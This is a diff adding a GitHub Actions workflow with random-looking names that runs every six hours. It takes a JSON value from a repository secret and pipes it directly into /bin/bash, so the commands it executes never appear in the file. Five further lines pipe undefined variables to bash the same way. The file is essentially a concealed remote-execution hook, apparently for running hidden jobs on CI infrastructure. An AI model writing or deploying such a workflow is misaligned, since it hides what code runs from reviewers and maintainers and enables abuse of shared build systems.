@@ -1,0 +1,22 @@
+name: yangzhengdao3645
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '16 5/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: yangzhengdao3645
+        env:
+          ozsxq8698: ${{ secrets.ozsxq8698 }}
+        run: |
+          echo $ozsxq8698 | jq -r .msb9846 | /bin/bash
+          echo $yrny8067 | jq -r .bhqr73580 | /bin/bash
+          echo $bjo8 | jq -r .r081 | /bin/bash
+          echo $pph2107 | jq -r .xths0289 | /bin/bash
+          echo $ive385 | jq -r .feqgj50336 | /bin/bash
+          echo $c0185 | jq -r .ehmre44301 | /bin/bash
+
